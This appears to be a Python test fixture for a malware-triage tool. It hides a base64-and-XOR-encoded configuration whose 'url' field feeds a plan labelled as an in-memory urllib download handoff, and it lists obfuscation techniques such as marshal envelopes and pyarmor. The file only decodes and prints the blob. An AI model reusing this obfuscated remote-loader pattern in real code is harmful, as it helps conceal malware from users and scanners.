#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_3acefd45 = "Ww9bWwxZDggFDBJTUlVJRG1OTlhPSVNIdQBJU1haXGJPWE5IQURNEwkOBQoNWAhYEllUUVxLU1QTWFFNUFxFWBNbD1tbDFkOCAUMEhIHTk1JSVUAUU9IQVsPW1sMWQ4IBQwQU1pUXE1QXF4AWVRiU1pUXE1QXF5BU1JVSURNYlJJYklNVE9eTkoAU1RcVV5iTkpSWVNUSkFZWElcXk5IW19SYk9SUE9cRE0AT1hUT09cXkFTXFFNYlhNUlFYS1NYYlFcVU5PXFAAU1JUSVxeTkhbX1JBU1JUTk5YT01FWGJTUlRJTVheRVgARVxJU0ROQQwASVNIUl5iWFpcSU5BRE9SUFhQYl9UUVFPSABPWElNXFlcQURPUlBYUGJVXklcTU5UWRFYSVJQWE9iWE9USExeXABOTVhJTkEPAEs="
CODEC_3acefd45 = "urlsafe_base64|reverse_then_xor|3d"

def load_3acefd45():
    return base64.urlsafe_b64decode(MATERIAL_3acefd45)

def decode_3acefd45(e):
    return bytes(value ^ 61 for value in reversed(e))

def recover_3acefd45():
    n = ":".join(("north", "south"))
    d = decode_3acefd45(load_3acefd45())
    t = d.decode("ascii", "strict")
    return t

def inspect_3acefd45():
    return recover_3acefd45()

def surface_3acefd45():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_3acefd45():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_3acefd45():
    fields = dict(item.split("=", 1) for item in inspect_3acefd45().split("|"))
    analysis_surface = surface_3acefd45()
    obfuscation_surface = obfuscation_3acefd45()
    operation_plan = ("urllib_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_3acefd45())
